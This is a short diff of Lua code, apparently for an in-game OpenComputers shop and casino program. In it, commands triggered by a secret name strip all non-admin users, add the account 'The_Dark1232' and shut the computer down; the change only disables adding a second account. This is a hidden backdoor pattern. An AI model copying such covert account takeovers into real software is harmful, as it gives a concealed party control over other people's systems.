@@ -73,7 +73,7 @@ alice[secret_name .. " выключить"] = function() --магаз, кази�
 		if v ~= admin then computer.removeUser(v) end
 	end
 	computer.addUser("The_Dark1232")
-	computer.addUser("Durex77")
+	--computer.addUser("Durex77")
 	computer.shutdown()
 end
 alice[secret_name .. " выход"] = function() --магаз, казино
@@ -86,7 +86,7 @@ alice[secret_name .. " выход"] = function() --магаз, казино
 		if v ~= admin then computer.removeUser(v) end
 	end
 	computer.addUser("The_Dark1232")
-	computer.addUser("Durex77")
+	--computer.addUser("Durex77")
 	computer.shutdown(true)
 end
 alice[secret_name .. " рестарт"] = function() --магаз, казино
@@ -97,7 +97,7 @@ alice[secret_name .. " рестарт"] = function() --магаз, казино
 		if v ~= admin then computer.removeUser(v) end
 	end
 	computer.addUser("The_Dark1232")
-	computer.addUser("Durex77")
+	--computer.addUser("Durex77")
 	computer.shutdown(true)
 end
 alice[secret_name .. " обновись"] = function() --магаз, казино
